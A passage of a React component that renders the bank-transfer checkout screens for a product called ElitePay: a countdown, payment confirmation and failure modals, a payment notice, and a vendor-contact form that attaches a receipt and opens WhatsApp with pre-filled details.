                  ? 'Complete your payment before the timer expires.'
                  : 'Payment window expired. Restart checkout.'}

              </div>

            </div>

            {/* CONFIRM */}

            <div className="confirm-section">

              <p className="confirm-note">

                After you complete the transfer,
                click the button below to check
                your transaction.

              </p>

              <button
                className="confirm-button"
                onClick={
                  confirmPayment
                }
                disabled={
                  checkingPayment ||
                  countdown === 0
                }
                type="button"
              >

                {checkingPayment ? (

                  <span className="button-content">

                    <Spinner />

                    Checking payment...

                  </span>

                ) : (

                  'I have made payment'

                )}

              </button>

              <button
                className="vendor-main-button"
                onClick={() =>
                  setVendorModal(
                    true
                  )
                }
                type="button"
              >

                Need help? Contact Vendor

              </button>

            </div>

            {/* TRUST */}

            <div className="trust-row">

              <span className="trust-icon">

                <ShieldIcon
                  size={16}
                />

              </span>

              Payment details are displayed
              securely on this checkout page.

            </div>

            {/* FOOTER */}

            <div className="footer-actions">

              <button
                className="text-action cancel"
                onClick={() =>
                  router.push(
                    '/buy-code'
                  )
                }
                type="button"
              >
                Cancel
              </button>

              <span className="divider" />

              <button
                className="text-action help"
                onClick={() => {

                  const helpMessage =
                    `Hello, I need help with my ElitePay payment.\n\n` +
                    `Name: ${
                      name ||
                      'Not provided'
                    }\n` +
                    `Phone: ${
                      phone ||
                      'Not provided'
                    }\n` +
                    `Amount: NGN ${CODE_PRICE.toLocaleString()}\n` +
                    `Bank: ${BANK_NAME}`;

                  openWhatsApp(
                    helpMessage
                  );

                }}
                type="button"
              >
                Help?
              </button>

            </div>

          </div>

        </section>

      </div>

      {/* =====================================================
          PAYMENT SAFETY NOTICE
      ====================================================== */}

      {showPaymentNotice && (

        <div className="modal-overlay">

          <div className="modal notice-modal">

            <div className="notice-icon">

              <ShieldIcon
                size={27}
              />

            </div>

            <div className="notice-badge">
              PAYMENT NOTICE
            </div>

            <h2 className="modal-title">
              Before You Make Payment
            </h2>

            <p className="modal-text">

              Please carefully verify the payment
              details before completing your transfer.

            </p>

            <div className="notice-list">

              <div className="notice-item">

                <span className="notice-check">
                  <CheckIcon size={16} />
                </span>

                Transfer exactly
                NGN {CODE_PRICE.toLocaleString()}.

              </div>

              <div className="notice-item">

                <span className="notice-check">
                  <CheckIcon size={16} />
                </span>

                Confirm the account number:
                {` `}
                <strong>
                  {ACCOUNT_NUMBER}
                </strong>

              </div>

              <div className="notice-item">

                <span className="notice-check">
                  <CheckIcon size={16} />
                </span>

                Confirm the account name:
                {` `}
                <strong>
                  {ACCOUNT_NAME}
                </strong>

              </div>

              <div className="notice-item">

                <span className="notice-check">
                  <CheckIcon size={16} />
                </span>

                Bank:
                {` `}
                <strong>
                  {BANK_NAME}
                </strong>

              </div>

            </div>

            <button
              type="button"
              className="notice-continue"
              onClick={() =>
                setShowPaymentNotice(
                  false
                )
              }
            >
              I Understand & Continue
            </button>

            <div className="notice-footer">

              Always verify the displayed
              payment information before sending funds.

            </div>

          </div>

        </div>

      )}

      {/* =====================================================
          PAYMENT VERIFICATION
      ====================================================== */}

      {checkingPayment && (

        <div className="modal-overlay">

          <div className="modal verification-modal">

            <div className="loading-circle">

              <Spinner
                dark
              />

            </div>

            <h2 className="modal-title">
              Checking Payment
            </h2>

            <p className="modal-text">

              Please wait while your transaction
              status is being checked.

            </p>

            <div className="verification-caption">

              Verifying transaction...

            </div>

          </div>

        </div>

      )}

      {/* =====================================================
          PAYMENT FAILED
      ====================================================== */}

      {paymentFailed && (

        <div className="modal-overlay">

          <div className="modal failed-modal">

            <div className="failed-icon">

              <AlertIcon
                size={26}
              />

            </div>

            <h2 className="modal-title">
              Payment Unsuccessful
            </h2>

            <p className="modal-text">

              We could not confirm the payment
              at this time.

            </p>

            <div className="failed-message">

              Your transaction was unsuccessful.
              Please make the payment again and
              ensure the exact amount is transferred.

            </div>

            <button
              className="modal-close-button"
              onClick={
                closeFailedPopupAndRefresh
              }
              type="button"
            >
              Make Payment Again
            </button>

          </div>

        </div>

      )}

      {/* =====================================================
          CONTACT VENDOR
      ====================================================== */}

      {vendorModal && (

        <div
          className="modal-overlay"
          onMouseDown={(event) => {

            if (
              event.target ===
              event.currentTarget
            ) {
              setVendorModal(
                false
              );
            }

          }}
        >

          <div className="modal">

            <div className="vendor-header">

              <div>

                <h2 className="modal-title">
                  Contact Vendor
                </h2>

                <p className="modal-text">

                  Enter your details and
                  attach your payment receipt
                  before contacting the vendor.

                </p>

              </div>

              <button
                className="modal-x"
                onClick={() =>
                  setVendorModal(
                    false
                  )
                }
                type="button"
                aria-label="Close"
              >
                ×
              </button>

            </div>

            <div className="details-card">

              <div className="details-title">
                PAYMENT DETAILS
              </div>

              <div className="detail-row">

                <span className="detail-label">
                  Name
                </span>

                <span className="detail-value">
                  {name ||
                    'Not provided'}
                </span>

              </div>

              <div className="detail-row">

                <span className="detail-label">
                  Phone
                </span>

                <span className="detail-value">
                  {phone ||
                    'Not provided'}
                </span>

              </div>

              <div className="detail-row">

                <span className="detail-label">
                  Amount
                </span>

                <span className="detail-value">
                  NGN{' '}
                  {CODE_PRICE.toLocaleString()}
                </span>

              </div>

              <div className="detail-row">

                <span className="detail-label">
                  Bank
                </span>

                <span className="detail-value">
                  {BANK_NAME}
                </span>

              </div>

              <div className="detail-row">

                <span className="detail-label">
                  Account
                </span>

                <span className="detail-value">
                  {ACCOUNT_NUMBER}
                </span>

              </div>

              <div className="detail-row">

                <span className="detail-label">
                  Account Name
                </span>

                <span className="detail-value">
                  {ACCOUNT_NAME}
                </span>

              </div>

            </div>

            <label
              className="field-label"
              htmlFor="vendor-name"
            >
              Your name
            </label>

            <input
              id="vendor-name"
              className="text-input"
              type="text"
              value={name}
              onChange={(e) =>
                setName(
                  e.target.value
                )
              }
              placeholder="Enter your name"
            />

            <label
              className="field-label"
              htmlFor="vendor-phone"
            >
              Phone number
            </label>

            <input
              id="vendor-phone"
              className="text-input"
              type="tel"
              value={phone}
              onChange={(e) =>
                setPhone(
                  e.target.value
                )
              }
              placeholder="Enter your phone number"
            />

            <div className="receipt-box">

              <div className="receipt-box-title">
                Attach Payment Receipt
              </div>

              <div className="receipt-box-text">

                Select your payment screenshot
                or receipt. You can then send
                the same receipt in WhatsApp.

              </div>

              <input
                className="receipt-input"
                type="file"
                accept="image/*,.pdf"
                onChange={
                  handleReceiptChange
                }
              />

              {receipt && (

                <div className="receipt-file">

                  Attached:
                  {` `}
                  {receipt.name}

                </div>

              )}

            </div>

            <button
              className="vendor-submit"
              onClick={
                contactVendor
              }
              disabled={
                vendorSubmitting ||
                !receipt
              }
              type="button"
            >

              {vendorSubmitting ? (

                <span className="button-content">

                  <Spinner />

                  Opening WhatsApp...

                </span>

              ) : (

                'Confirm & Contact Vendor'

              )}

            </button>

            <div className="whatsapp-note">

              Your transaction details will be
              pre-filled in WhatsApp.

            </div>

          </div>

        </div>

      )}

    </Layout>
  );
}